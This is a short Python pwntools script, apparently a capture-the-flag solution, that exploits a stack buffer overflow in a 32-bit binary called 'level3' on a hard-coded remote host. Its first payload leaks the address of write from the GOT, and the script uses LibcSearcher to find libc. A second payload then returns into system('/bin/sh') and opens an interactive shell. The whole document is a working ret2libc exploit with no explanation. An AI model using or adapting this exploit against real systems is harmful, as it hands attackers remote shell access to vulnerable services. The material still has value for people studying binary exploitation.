from pwn import *
from LibcSearcher import LibcSearcher

# p = process("./level3")
p = remote("111.198.29.45" , 30883)
elf = ELF("./level3")

vuln = elf.sym["vulnerable_function"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]

payload1 = "a" * 0x88 + "b" * 0x4 
payload1 += p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(0x4)
p.sendafter("Input:\n" , payload1)
write_addr = u32(p.recv(4))
print(hex(write_addr))
libc = LibcSearcher("write" , write_addr)
libc_base = write_addr - libc.dump("write")
system_addr = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

payload2 = "a" * 0x88 + "b" * 0x4
payload2 += p32(system_addr) + p32(0) + p32(str_bin_sh)
p.sendafter("Input:\n" , payload2)
p.interactive()
